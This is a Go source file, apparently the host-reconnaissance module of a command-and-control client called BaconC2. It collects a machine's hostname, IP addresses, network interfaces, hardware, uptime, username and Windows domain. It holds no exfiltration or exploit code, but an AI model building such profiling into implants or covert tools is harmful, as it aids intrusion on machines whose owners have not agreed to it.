package sysinfo

import (
	"net"
	"os"
	"runtime"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/models"
	"github.com/shirou/gopsutil/v4/cpu"
	"github.com/shirou/gopsutil/v4/disk"
	"github.com/shirou/gopsutil/v4/host"
	"github.com/shirou/gopsutil/v4/mem"
	"github.com/shirou/gopsutil/v4/process"
)

type SystemInfo struct {
	Hostname          string
	PrimaryIP         string
	NetworkInterfaces []models.NetworkInterface
	OS                string
	Architecture      string
	CPUInfo           string
	MemoryTotal       uint64
	MemoryFree        uint64
	DiskTotal         uint64
	DiskFree          uint64
	Uptime            uint64
	ProcessCount      int
	Username          string
	Domain            string
	LastBootTime      string
}

func GatherSystemInfo() (SystemInfo, error) {
	info := SystemInfo{}

	// Hostname
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	info.Hostname = hostname

	// Primary IP
	info.PrimaryIP = getOutboundIP()

	// Network interfaces
	interfaces, err := getNetworkInterfaces()
	if err != nil {
		interfaces = []models.NetworkInterface{}
	}
	info.NetworkInterfaces = interfaces

	// OS and architecture
	info.OS = runtime.GOOS
	info.Architecture = runtime.GOARCH

	// CPU info
	cpuInfo, err := cpu.Info()
	if err == nil && len(cpuInfo) > 0 {
		info.CPUInfo = cpuInfo[0].ModelName
	} else {
		info.CPUInfo = "unknown"
	}

	// Memory info
	memInfo, err := mem.VirtualMemory()
	if err == nil {
		info.MemoryTotal = memInfo.Total
		info.MemoryFree = memInfo.Free
	}

	// Disk info
	diskInfo, err := disk.Usage("/")
	if err == nil {
		info.DiskTotal = diskInfo.Total
		info.DiskFree = diskInfo.Free
	}

	// Uptime and boot time
	hostInfo, err := host.Info()
	if err == nil {
		info.Uptime = hostInfo.Uptime
		bootTime := time.Unix(int64(hostInfo.BootTime), 0)
		info.LastBootTime = bootTime.Format(time.RFC3339)
	}

	// Process count
	processes, err := process.Processes()
	if err == nil {
		info.ProcessCount = len(processes)
	}

	// Username
	info.Username = os.Getenv("USER")
	if info.Username == "" {
		info.Username = os.Getenv("USERNAME")
	}
	if info.Username == "" {
		info.Username = "unknown"
	}

	// Domain (Windows-specific)
	if runtime.GOOS == "windows" {
		info.Domain = os.Getenv("USERDOMAIN")
	}

	return info, nil
}

func getNetworkInterfaces() ([]models.NetworkInterface, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}

	var result []models.NetworkInterface
	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		var ips []string
		for _, addr := range addrs {
			ip, _, err := net.ParseCIDR(addr.String())
			if err == nil {
				ips = append(ips, ip.String())
			}
		}

		result = append(result, models.NetworkInterface{
			Name:    iface.Name,
			MAC:     iface.HardwareAddr.String(),
			IPs:     ips,
			Netmask: "", // TODO: Implement platform-specific netmask retrieval
			Gateway: "", // TODO: Implement platform-specific gateway retrieval
			IsUp:    iface.Flags&net.FlagUp != 0,
		})
	}
	return result, nil
}

func getOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}
